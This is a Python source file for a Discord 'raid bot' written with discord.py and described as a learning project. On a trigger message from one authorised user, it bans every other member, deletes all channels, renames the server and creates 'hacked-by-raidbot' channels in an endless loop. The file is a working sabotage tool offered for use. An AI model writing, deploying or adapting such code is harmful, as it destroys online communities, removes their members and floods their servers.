# An intelligent raid bot created in Python to deepen my understanding of the discordpy API. #

import discord
import multiprocessing
import time
import subprocess

# Application token REFER to the readme to get your application token.

login_token = ""

# The AUTH_USER holds the username of the user that can execute ORDER

AUTH_USER = ""

# Excludes yourself from being banned.

username_exclusions = AUTH_USER

# The order that the AUTH_USER will use to execute the raid bot

ORDER = ""

# Edit GUILD variable data to your guild ID by right-clicking the server and copying the server ID.

GUILD = 1245613952373624832


def remove_users():
    class user_purge(discord.Client):
        async def on_message(self, message):
            if str(message.author) == AUTH_USER:
                if message.content == ORDER:
                    for user in self.get_all_members():
                        if str(user) == username_exclusions:
                            pass
                        else:
                            try:
                                await user.ban()
                            except discord.Forbidden as e:
                                print("raid-bot is not banning users: ERROR CODE: {}".format(e))

    permissions = discord.Intents.all()
    user_purge_call = user_purge(intents=permissions)
    user_purge_call.run(token=login_token, log_level=0)


def main():
    class remove_channels(discord.Client):
        async def on_ready(self):
            print("[:] Logging in and connecting to the gateway..")
            time.sleep(5)
            print("[:] Raid BOT Online and awaiting orders")

        async def on_message(self, message):
            if str(message.author) == AUTH_USER:
                if message.content == ORDER:
                    print("\n- Deploying threads...")
                    print("- Initiating raid")
                    for channels in self.get_all_channels():
                        if message.content == "stop":
                            await exit()
                        await channels.delete()
                    guild = self.get_guild(GUILD)
                    await guild.edit(name="raid-bot-home")
                    print("\n- creating channels...")
                    while True:
                        await guild.create_text_channel("hacked-by-raidbot")

    permissions = discord.Intents.all()
    remove_channels_call = remove_channels(intents=permissions)
    remove_channels_call.run(login_token, log_level=0)


def initialize_bot():
    t1 = multiprocessing.Process(target=main, name="main_script")
    t2 = multiprocessing.Process(target=remove_users, name="ban_users")

    processes = [t1, t2]
    for start in processes:
        start.start()
    for join in processes:
        join.join()


def bot_configuration():
    subprocess.run(["cls"], shell=True)
    print("Welcome to raid-bot!\n")
    print("\n1) Load saved bot")
    print("\n2) Create new bot\n")
    configure = input("\nraid-bot-Configurator> ")
    if configure == "1":
        initialize_bot()
    elif configure == "2":
        exit()

if __name__ == "__main__":
    bot_configuration()
